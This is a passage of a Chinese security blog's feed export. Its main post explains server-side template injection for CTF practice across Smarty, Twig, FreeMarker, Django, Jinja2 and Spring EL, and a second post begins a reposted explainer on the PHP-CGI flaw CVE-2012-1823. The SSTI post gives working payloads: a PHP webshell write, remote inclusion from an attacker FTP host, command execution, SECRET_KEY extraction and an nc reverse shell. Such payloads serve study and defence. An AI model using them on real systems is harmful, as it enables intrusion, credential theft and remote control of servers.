%&amp;#123;REQUEST_FILENAME&amp;#125; !-d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  RewriteCond %&amp;#123;REQUEST_FILENAME&amp;#125; !-f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/IfModule&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;要改成这样，并且打开伪静态模块&lt;/p&gt;</summary>
    
    
    
    <category term="编程" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>SSTI理解</title>
    <link href="http://example.com/2020/09/14/SSTI%E7%90%86%E8%A7%A3/"/>
    <id>http://example.com/2020/09/14/SSTI%E7%90%86%E8%A7%A3/</id>
    <published>2020-09-14T07:20:20.000Z</published>
    <updated>2020-09-14T15:49:18.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-、什么是SSTI"><a href="#一-、什么是SSTI" class="headerlink" title="一 、什么是SSTI"></a>一 、什么是SSTI</h1><h2 id="0x00-模板注入"><a href="#0x00-模板注入" class="headerlink" title="0x00 模板注入"></a>0x00 模板注入</h2><p>这是基于现在的MVC成熟的开发模式所导致的，开发者将输入通过V接收，交给C，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做<strong>模板</strong>的技术。<strong>这种模板的技术不是仅存在于Python</strong>，只要能使用模版进行开发的地方都会有这个问题，SSTI不属于任何一种的问题，沙盒绕过也不是。</p><h2 id="0x01常见的模板"><a href="#0x01常见的模板" class="headerlink" title="0x01常见的模板"></a>0x01常见的模板</h2><p>PHP：Smarty，Twig（经常出题），Blade</p><p>Java：JSP，FreeMarker，Velocity</p><p>Python： Jinja2（常用），django，tornado</p><p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号中执行</p><a id="more"></a><h2 id="0x02-漏洞形成"><a href="#0x02-漏洞形成" class="headerlink" title="0x02 漏洞形成"></a>0x02 漏洞形成</h2><p>同SQL注入，别太相信用户的输入</p><h2 id="0x03-漏洞检测"><a href="#0x03-漏洞检测" class="headerlink" title="0x03 漏洞检测"></a>0x03 漏洞检测</h2><p>加payload进行输入，然后进行查看回显</p><h2 id="0x04-开始攻击"><a href="#0x04-开始攻击" class="headerlink" title="0x04 开始攻击"></a>0x04 开始攻击</h2><p>1.攻击方向</p><ul><li>模版本身</li><li>框架本身</li><li>语言本身</li><li>应用本身</li></ul><p>2.攻击方法</p><ul><li>模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数</li><li>语言本身的特性，比如 面向对象的内省机制</li><li>寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意：面向对象的语言中，获取父类这种思想要贯穿始终，</span><br><span class="line">理论基础：</span><br><span class="line">    Python 的魔法方法</span><br><span class="line">    PHP 的自省</span><br><span class="line">    JAVA 的反射机制</span><br></pre></td></tr></table></figure><h3 id="利用模板本身的特性进行攻击"><a href="#利用模板本身的特性进行攻击" class="headerlink" title="利用模板本身的特性进行攻击"></a>利用模板本身的特性进行攻击</h3><p>1.Smarty</p><p>这个模版不能执行PHP中直接进行命令的函数，但是对于语言的限制并不能够影响我们执行命令。(因为没有阅读文档，所以直接从大佬文章中摘抄)。<code>$</code>+内置变量可以访问各种环境变量，比如其中self得到smarty这个类，我们就可以开始去找文档中的好方法了</p><p><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></p><p>这个函数可以读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#123;self::getStreamVariable(&quot;flag.php&quot;)&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></p><p>这是一个写文件的，这个类中有一个writeFile方法， </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes file in a safe way to disk</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_filepath complete filepath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_contents file content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Smarty $smarty    smarty instance</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SmartyException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params">$_filepath, $_contents, Smarty $smarty</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $_error_reporting = error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $old_umask = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath = dirname($_filepath);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> ($_dirpath !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : $smarty-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        $_tmp_file = $_dirpath . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Windows&#x27; rename() fails if the destination exists,</span></span><br><span class="line"><span class="comment">         * Linux&#x27; rename() properly handles the overwrite.</span></span><br><span class="line"><span class="comment">         * Simply unlink()ing a file might cause other processes</span></span><br><span class="line"><span class="comment">         * currently reading that file to fail, but linux&#x27; rename()</span></span><br><span class="line"><span class="comment">         * seems to be smart enough to handle that for us.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params">$varname = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure><p>2.Twig</p><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了。但是可以查阅<a href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a></p><p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env。env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png"></p><p>因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是这里就又需要我们的远程文件包含漏洞了。allow_url_include 一般是不打开的，没法包含远程文件。</p><p>新的大佬又出现了:</p><p> <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p><p>我们只要把exec() 作为回调函数传进去就能实现命令执行了.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure><p>3.freeMarker</p><p>java模板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure><p>查找文档，查看框架源码，等方式寻找这个 payload 的思路来源</p><h3 id="利用框架本身的特性进行攻击"><a href="#利用框架本身的特性进行攻击" class="headerlink" title="利用框架本身的特性进行攻击"></a>利用框架本身的特性进行攻击</h3><p>1.Django</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request, *args, **kwargs</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;Hello &#123;user&#125;, This is your email: &#x27;</span> + request.GET.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure><p>注入点很明显就是 email,但是我们能够做的事情已经被限制得很死了，很难再执行命令了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</span><br></pre></td></tr></table></figure><p>我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件。</p><p>思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line">&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure><p>2.Flask/Jinja2</p><p>config 是Flask模版中的一个全局对象，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code>, 以及<code>root_path</code>。这里我们利用 <code>from_pyfile</code> 和 <code>from_object</code> 来命令执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_pyfile</span>(<span class="params">self, filename, silent=False</span>):</span></span><br><span class="line"></span><br><span class="line">    filename = os.path.join(self.root_path, filename)</span><br><span class="line">    d = types.ModuleType(<span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">    d.__file__ = filename</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> config_file:</span><br><span class="line">            exec(compile(config_file.read(), filename, <span class="string">&#x27;exec&#x27;</span>), d.__dict__)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> silent <span class="keyword">and</span> e.errno <span class="keyword">in</span> (errno.ENOENT, errno.EISDIR):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        e.strerror = <span class="string">&#x27;Unable to load configuration file (%s)&#x27;</span> % e.strerror</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line">    self.from_object(d)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_object</span>(<span class="params">self, obj</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isinstance(obj, string_types):</span><br><span class="line">        obj = import_string(obj)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dir(obj):</span><br><span class="line">        <span class="keyword">if</span> key.isupper():</span><br><span class="line">            self[key] = getattr(obj, key)</span><br></pre></td></tr></table></figure><p>这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 <code>d.__dict__</code>翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，</p><p>这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from os import system</span><br><span class="line">SHELL &#x3D; system</span><br></pre></td></tr></table></figure><p>到时候我们就能通过 config[‘SHELL’] 调用 system 方法了</p><p>那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过,大佬的一篇博文[python 沙盒逃逸备忘](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;加载system</span><br><span class="line">&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令反弹SHELL</span><br></pre></td></tr></table></figure><p>3.Tornado</p><p>我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 <code>需要的值</code>我特地看一下模板的对框架的语法支持(因为，<code>模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字</code>，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )</p><p>护网杯的easytornado，全局搜索sercet-key，然后再查看官方文档</p><h4 id="2-利用模语言本身的特性进行攻击《转载》"><a href="#2-利用模语言本身的特性进行攻击《转载》" class="headerlink" title="2.利用模语言本身的特性进行攻击《转载》"></a><strong>2.利用模语言本身的特性进行攻击</strong>《转载》</h4><h5 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a><strong>1.Python</strong></h5><p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在大佬的[一篇博文](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)中</p><h5 id="2-JAVA"><a href="#2-JAVA" class="headerlink" title="2.JAVA"></a><strong>2.JAVA</strong></h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类</p><p><strong>如下图所示：</strong></p><p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p><p>有了这个基础我们就能想到这样的payload</p><p><strong>payload：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;cat etc/passwd&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure><p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;一-、什么是SSTI&quot;&gt;&lt;a href=&quot;#一-、什么是SSTI&quot; class=&quot;headerlink&quot; title=&quot;一 、什么是SSTI&quot;&gt;&lt;/a&gt;一 、什么是SSTI&lt;/h1&gt;&lt;h2 id=&quot;0x00-模板注入&quot;&gt;&lt;a href=&quot;#0x00-模板注入&quot; class=&quot;headerlink&quot; title=&quot;0x00 模板注入&quot;&gt;&lt;/a&gt;0x00 模板注入&lt;/h2&gt;&lt;p&gt;这是基于现在的MVC成熟的开发模式所导致的，开发者将输入通过V接收，交给C，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做&lt;strong&gt;模板&lt;/strong&gt;的技术。&lt;strong&gt;这种模板的技术不是仅存在于Python&lt;/strong&gt;，只要能使用模版进行开发的地方都会有这个问题，SSTI不属于任何一种的问题，沙盒绕过也不是。&lt;/p&gt;
&lt;h2 id=&quot;0x01常见的模板&quot;&gt;&lt;a href=&quot;#0x01常见的模板&quot; class=&quot;headerlink&quot; title=&quot;0x01常见的模板&quot;&gt;&lt;/a&gt;0x01常见的模板&lt;/h2&gt;&lt;p&gt;PHP：Smarty，Twig（经常出题），Blade&lt;/p&gt;
&lt;p&gt;Java：JSP，FreeMarker，Velocity&lt;/p&gt;
&lt;p&gt;Python： Jinja2（常用），django，tornado&lt;/p&gt;
&lt;p&gt;tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号中执行&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2012-1823</title>
    <link href="http://example.com/2020/09/13/CVE-2012-1823/"/>
    <id>http://example.com/2020/09/13/CVE-2012-1823/</id>
    <published>2020-09-13T03:15:07.000Z</published>
    <updated>2020-09-13T13:30:36.892Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lt-转载-gt-PHP-CGI远程代码执行漏洞"><a href="#lt-转载-gt-PHP-CGI远程代码执行漏洞" class="headerlink" title="&lt;转载&gt;PHP-CGI远程代码执行漏洞"></a>&lt;转载&gt;PHP-CGI远程代码执行漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>影响的:php &lt; 5.3.12 or php &lt; 5.4.2</p><p>转载链接：</p><ul><li><a href="https://baijiahao.baidu.com/s?id=1637483210158521104&amp;wfr=spider&amp;for=pc1">https://baijiahao.baidu.com/s?id=1637483210158521104&amp;wfr=spider&amp;for=pc1</a></li><li><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></li></ul><h2 id="漏洞解读"><a href="#漏洞解读" class="headerlink" title="漏洞解读"></a>漏洞解读</h2><h3 id="CGi-协议"><a href="#CGi-协议" class="headerlink" title="CGi 协议"></a>CGi 协议</h3><p>CGI是一种网页表单和程序之间通信的一种协议，和HTTP协议一样，用于进行数据交换。可以用任何语言来写一个CGI脚本，这些语言只要能接受输入输出信息，读取环境变量。</p><p>php-cgi也是一个sapi。在远古的时候，web应用的运行方式很简单，web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork出一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，同时这个解释器子进程也就结束了。基于bash、perl等语言的web应用多半都是以这种方式来执行，这种执行方式一般就被称为cgi</p> <a id="more"></a><p>CGI把用户传递过来的数据穿过来的数据转变成key-value的字典。这个字典中不光有用户的数据，还有HTTP协议的参数，方便任何符合CGI协议的程序调用！但是本身不负责通信，通信的话是通过socket，也就是server。<strong>cgi协议用来确定webserver（例如nginx），也就是内容分发服务器传递过来什么数据，什么样格式的数据</strong></p><p><img src="https://i.loli.net/2020/09/13/ifkl61EM342rQ8t.jpg" alt="2fdda3cc7cd98d1021b8843eb2ceb20b7aec9043.jpeg"></p><p>每次启动时，需要经历加载php.ini文件-&gt;初始化执行环境-&gt;处理请求-&gt;返回内容给webserver-&gt;php-cgi进程退出的流程。</p><p><img src="https://i.loli.net/2020/09/13/6H5KUrPxEvW2aAd.jpg" alt="f636afc379310a55337a36e524b449ac832610bf.jpeg"></p><p>这是PHP-fastcgi的原理图，本身上是对cgi的一次升级。fastcgi协议是对cgi协议效率提升的补充，主要是针对每次请求过来时都需要启动一个cgi解释器进程的优化，不再需要cgi解释器进程每次收到webserver请求后都需要重新加载php.ini文件和初始化执行环境。</p><p>HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  &#x2F;* Header *&#x2F;</span><br><span class="line">  unsigned char version; &#x2F;&#x2F; 版本</span><br><span class="line">  unsigned char type; &#x2F;&#x2F; 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  &#x2F;* Body *&#x2F;</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p><p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p><p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p><p>可见，一个fastcgi 